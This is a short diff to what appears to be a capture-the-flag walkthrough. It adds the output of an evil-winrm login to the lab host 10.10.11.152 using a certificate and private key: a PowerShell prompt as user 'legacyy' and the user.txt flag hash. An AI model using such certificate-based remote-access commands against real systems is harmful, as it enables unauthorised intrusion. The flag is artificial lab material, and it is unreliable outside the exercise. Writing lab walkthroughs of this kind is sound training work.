@@ -326,8 +326,10 @@ Enter Import Password:
 
 ````
 $ evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u
-
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> cat user.txt
+8acd93fced1257b5205467e86f96d6ff
 ````
+
 
 
 ## User
